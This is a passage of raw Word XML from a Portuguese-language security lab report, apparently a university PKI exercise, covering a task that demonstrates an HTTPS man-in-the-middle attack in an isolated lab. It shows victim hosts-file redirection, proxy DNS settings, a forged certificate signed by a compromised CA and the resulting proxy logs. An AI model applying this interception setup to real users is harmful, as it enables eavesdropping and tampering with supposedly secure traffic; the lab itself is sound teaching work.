        <w:pStyle w:val="FirstParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:t>Output:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C4127B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00842992" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>X509v3 Subject Alternative Name:</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    DNS:www.antixerox.com</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    DNS:antixerox.com</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    DNS:*.antixerox.com</w:t>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    DNS:bank32.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D05C6C3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Agora o servidor aceita conexões para </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>todos estes nomes</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="66" w:name="task-2-tls-server"/>
    <w:bookmarkStart w:id="67" w:name="X547299751e4094594d4fd8d522f1de3c6fdaade"/>
    <w:bookmarkStart w:id="68" w:name="verificação"/>
    <w:p w14:paraId="01A6F029" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="373EC5C0" wp14:editId="7E352C51">
                <wp:extent cx="5943600" cy="19046"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19054"/>
                <wp:docPr id="1269635145" name="Retângulo 18"/>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1AD18096" id="Retângulo 18"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bookmarkEnd w:id="66"/>
      <w:bookmarkEnd w:id="67"/>
      <w:bookmarkEnd w:id="68"/>
    </w:p>
    <w:p w14:paraId="7C581165" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000" w:rsidP="00392CCA">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="69" w:name="_Toc213874711"/>
      <w:bookmarkStart w:id="70" w:name="task-3-https-proxy-mitm-attack"/>
      <w:bookmarkStart w:id="71" w:name="_Toc213881909"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Task 3: HTTPS Proxy (MITM Attack)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="69"/>
      <w:bookmarkEnd w:id="71"/>
    </w:p>
    <w:p w14:paraId="59A0569A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="72" w:name="_Toc213874712"/>
      <w:bookmarkStart w:id="73" w:name="objetivo"/>
      <w:bookmarkStart w:id="74" w:name="_Toc213881910"/>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
      <w:bookmarkEnd w:id="72"/>
      <w:bookmarkEnd w:id="74"/>
    </w:p>
    <w:p w14:paraId="772725C9" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Demonstrar um ataque </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Man-In-The-Middle</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> quando a PKI é comprometida.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="73"/>
    </w:p>
    <w:p w14:paraId="33E19A0A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="75" w:name="_Toc213874713"/>
      <w:bookmarkStart w:id="76" w:name="cenário-do-ataque"/>
      <w:bookmarkStart w:id="77" w:name="_Toc213881911"/>
      <w:r>
        <w:t>Cenário do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="75"/>
      <w:bookmarkEnd w:id="77"/>
    </w:p>
    <w:p w14:paraId="70DF3B96" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Browser → [pensa que fala com Bank32]</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Proxy MITM (10.9.0.143)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓ [usa certificado falso mas assinado pela CA comprometida]</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Browser aceita conexão</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Proxy modifica conteúdo: "Bank32" → "antixerox"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Browser recebe conteúdo alterado</w:t>
      </w:r>
      <w:bookmarkEnd w:id="76"/>
    </w:p>
    <w:p w14:paraId="3EFDCE0C" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="78" w:name="_Toc213874714"/>
      <w:bookmarkStart w:id="79" w:name="_Toc213881912"/>
      <w:r>
        <w:t>Implementação do Proxy</w:t>
      </w:r>
      <w:bookmarkEnd w:id="78"/>
      <w:bookmarkEnd w:id="79"/>
    </w:p>
    <w:p w14:paraId="29D67335" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Estrutura</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230E91B8" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251668480" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="58F209E6" wp14:editId="58729ABD">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="5294632"/>
            <wp:effectExtent l="0" t="0" r="0" b="1268"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="1099541548"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5294632"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="80" w:name="estrutura"/>
      <w:bookmarkEnd w:id="80"/>
    </w:p>
    <w:p w14:paraId="00F9150B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EA8E843" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Servidor do Proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E3450E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251669504" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3FA72ADD" wp14:editId="0B2430D6">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:align>center</wp:align>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>630</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5943600" cy="3178170"/>
            <wp:effectExtent l="0" t="0" r="0" b="3180"/>
            <wp:wrapSquare wrapText="largest"/>
            <wp:docPr id="6962058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178170"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                      <a:prstDash/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:bookmarkStart w:id="81" w:name="implementação-do-proxy"/>
      <w:bookmarkStart w:id="82" w:name="servidor-do-proxy"/>
      <w:bookmarkEnd w:id="81"/>
      <w:bookmarkEnd w:id="82"/>
    </w:p>
    <w:p w14:paraId="09DD1310" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="83" w:name="_Toc213874715"/>
      <w:bookmarkStart w:id="84" w:name="configuração-do-ataque"/>
      <w:bookmarkStart w:id="85" w:name="_Toc213881913"/>
      <w:r>
        <w:t>Configuração do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="83"/>
      <w:bookmarkEnd w:id="85"/>
    </w:p>
    <w:p w14:paraId="013112A6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Redirecionamento DNS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A528DE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># Em /etc/hosts da vítima (host VM)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
        </w:rPr>
        <w:t>10.9.0.143</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> www.antixerox.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251DC031" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="86" w:name="redirecionamento-dns"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Isto simula um ataque de DNS poisoning ou BGP hijacking.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="86"/>
    </w:p>
    <w:p w14:paraId="0162DA31" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="87" w:name="configuração-do-proxy"/>
      <w:r>
        <w:t>2. Configuração do Proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48593ABB" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>No container do proxy, usar DNS externo para alcançar servidor real:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="222EE2DD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># Em /etc/resolv.conf do proxy</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
        </w:rPr>
        <w:t>nameserver</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> 8.8.8.8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC20FCC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">Ou no </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>docker-compose.yml</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE50B4E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="FunctionTok"/>
        </w:rPr>
        <w:t>dns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="KeywordTok"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="KeywordTok"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AttributeTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="FloatTok"/>
        </w:rPr>
        <w:t>8.8.8.8</w:t>
      </w:r>
      <w:bookmarkEnd w:id="84"/>
      <w:bookmarkEnd w:id="87"/>
    </w:p>
    <w:p w14:paraId="13EF9577" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
        <w:pageBreakBefore/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6945BFCF" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="88" w:name="_Toc213874716"/>
      <w:bookmarkStart w:id="89" w:name="demonstração-do-ataque"/>
      <w:bookmarkStart w:id="90" w:name="_Toc213881914"/>
      <w:r>
        <w:t>Demonstração do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="88"/>
      <w:bookmarkEnd w:id="90"/>
    </w:p>
    <w:p w14:paraId="33DC5047" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="91" w:name="fase-1-servidor-legítimo"/>
      <w:r>
        <w:t>Fase 1: Servidor Legítimo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="260072BC" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Browser (com CA instalada)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>https://www.antixerox.com → 10.9.0.43 (servidor real)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Página exibida: "Welcome to Bank32"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>✓ Cadeado verde (conexão segura)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="91"/>
    </w:p>
    <w:p w14:paraId="7A3E5FF3" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:bookmarkStart w:id="92" w:name="fase-2-mitm-ativo"/>
      <w:r>
        <w:t>Fase 2: MITM Ativo</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45F3DC52" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># Script altera /etc/hosts</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ExtensionTok"/>
        </w:rPr>
        <w:t>10.9.0.143</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="NormalTok"/>
        </w:rPr>
        <w:t xml:space="preserve"> www.antixerox.com  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentTok"/>
        </w:rPr>
        <w:t># agora aponta para proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3758171F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Browser (CTRL+SHIFT+R para reload)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>https://www.antixerox.com → 10.9.0.143 (PROXY!)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Proxy apresenta certificado válido (assinado pela CA comprometida)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Browser ACEITA (CA é confiável!)</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Proxy modifica resposta: Bank32 → antixerox</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t xml:space="preserve">    ↓</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>Página exibida: "Welcome to antixerox"</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>✓ Cadeado verde (mas conteúdo alterado!)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="89"/>
      <w:bookmarkEnd w:id="92"/>
    </w:p>
    <w:p w14:paraId="497BD83A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="93" w:name="_Toc213874717"/>
      <w:bookmarkStart w:id="94" w:name="logs-do-ataque"/>
      <w:bookmarkStart w:id="95" w:name="_Toc213881915"/>
      <w:r>
        <w:t>Logs do Ataque</w:t>
      </w:r>
      <w:bookmarkEnd w:id="93"/>
      <w:bookmarkEnd w:id="95"/>
    </w:p>
    <w:p w14:paraId="2F230C5A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
        <w:rPr>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>Server log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>/tmp/server.log</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9DA605" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00363733" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[server] Starting Bank32 HTTPS Server...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[server] ✓ Bank32 listening on 0.0.0.0:443</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F6F90A" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="FirstParagraph"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Proxy log</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
        </w:rPr>
        <w:t>/tmp/proxy.log</w:t>
      </w:r>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBCCBC7" w14:textId="77777777" w:rsidR="004253CC" w:rsidRPr="00371B58" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="SourceCode"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[proxy] Starting MITM Proxy...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>[proxy] ✓ MITM Proxy listening on 0.0.0.0:443</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Fontepargpadro"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="VerbatimChar"/>
